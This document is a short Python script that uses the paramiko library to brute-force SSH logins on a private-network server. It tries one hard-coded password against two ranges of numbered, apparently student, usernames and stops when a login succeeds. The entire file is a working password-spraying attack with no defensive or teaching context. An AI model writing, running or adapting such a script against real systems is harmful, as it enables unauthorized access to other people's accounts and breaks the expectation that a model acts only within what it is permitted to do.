import paramiko
import time

# Server details
HOST = '10.5.12.254'
PASSWORD = 'gapwqbhz'
PORT = 22

# User ID ranges
RANGE1_START = 2022103031
RANGE1_END = 2022103060
RANGE2_START = 2022103541
RANGE2_END = 2022103580

def try_login(user_id):
    print(f"Trying user ID: s{user_id}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(HOST, port=PORT, username=f"s{user_id}", password=PASSWORD, timeout=5)
        print(f"Successful login with user ID: s{user_id}")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        ssh.close()

# Brute-force in the ranges
for user_id in list(range(RANGE1_START, RANGE1_END + 1)) + list(range(RANGE2_START, RANGE2_END + 1)):
    if try_login(user_id):
        break
    time.sleep(4)

print("Brute-force attempt completed.")

